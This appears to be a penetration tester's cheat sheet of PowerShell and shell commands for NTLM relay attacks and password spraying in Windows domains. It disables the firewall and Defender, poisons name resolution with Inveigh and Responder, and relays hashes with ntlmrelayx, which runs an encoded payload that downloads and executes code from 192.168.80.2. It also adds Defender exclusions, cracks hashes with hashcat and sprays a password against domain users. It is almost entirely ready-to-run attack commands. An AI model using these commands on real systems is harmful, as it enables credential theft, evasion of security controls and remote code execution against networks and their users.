## NTLM Relay

### Disable Protection
```powershell
Set-NetFirewallProfile -Profile Domain,Public,Private -Enabled False
Set-MpPreference -DisableRealtimeMonitoring $true -MAPSReporting 0 -SubmitSamplesConsent 0
```

### Stop SMB Service
```powershell
sc stop lanmanserver
sc config lanmanserver start=disabled
```

### Execute Inveigh
```powershell
powershell -exec bypass
Import-Module .\Inveigh.ps1
Invoke-Inveigh -ConsoleOutput Y -mDNS Y -LLMNR Y -NBNS Y -HTTP N -SMB N -IP <attackerIP>
```

### Execute NTLMRelayX
```powershell
python3 -m pip install impacket pyreadline dsinternals
python3 ntlmrelayx.py -smb2support -debug -tf targets.txt -of hashes.txt -c "powershell.exe -nop -w hidden -enc SQBFAFgAIAAoACgAbgBlAHcALQBvAGIAagBlAGMAdAAgAG4AZQB0AC4AdwBlAGIAYwBsAGkAZQBuAHQAKQAuAGQAbwB3AG4AbABvAGEAZABzAHQAcgBpAG4AZwAoACcAaAB0AHQAcAA6AC8ALwAxADkAMgAuADEANgA4AC4AOAAwAC4AMgA6ADgAMAAvAGEAJwApACkA"
```

### Inveigh MITM
```powershell
Invoke-Inveigh -ConsoleOutput Y -mDNS Y -LLMNR Y -NBNS Y -HTTPS Y -Proxy Y -IP <attackerIP>
Watch-Inveigh
Stop-Inveigh
Clear-Inveigh
Get-Inveigh -NTLMv2 -Session -Enumerate
```

### Responder
```powershell
python3 Responder.py -I eth0
```

### Hashcat
```powershell
hashcat -m 5600 -a 3 hash.txt
```

### Windows Defender
```powershell
netsh advfirewall show all

netsh interface portproxy show v4tov4
netsh interface portproxy delete v4tov4 listenport=445 listenaddress=0.0.0.0
netsh interface portproxy add v4tov4 listenport=445 listenaddress=0.0.0.0 connectaddress=192.168.80.2 connectport=445

Get-MpComputerStatus | findstr True
Get-MpComputerStatus | findstr False
Get-MpPreference | select *Exclusion*

Start-MpScan -ScanType CustomScan -ScanPath "C:\Users\user\Downloads"

Set-MpPreference -ExclusionPath C:\Users -ExclusionExtension docx
Remove-MpPreference -ExclusionPath C:\Users -ExclusionExtension docx

Set-MpPreference -DisableRealtimeMonitoring $false -MAPSReporting 2 -SubmitSamplesConsent 1
```

### SMB Service
```powershell
sc config lanmanserver start=auto
sc start lanmanserver
sc query lanmanserver
sc qc lanmanserver
```

### Powershel Encoding
```powershell
$str = "IEX ((new-object net.webclient).downloadstring('http://192.168.80.2:80/a'))"
[System.Convert]::ToBase64String([System.Text.Encoding]::Unicode.GetBytes($str))
```

## Password Spraying
```powershell
powershell -exec bypass
Import-Module .\PowerView.ps1
Import-Module .\DomainPasswordSpray.ps1

Get-DomainPolicy | select -ExpandProperty systemaccess

Get-DomainUser | ? { $_.badpwdcount -lt 2 -and $_.useraccountcontrol -notmatch 'disable'} | foreach { $_.samaccountname } > users.txt

Invoke-DomainPasswordSpray -UserList .\users.txt -Password P@ssw0rd -Force
```
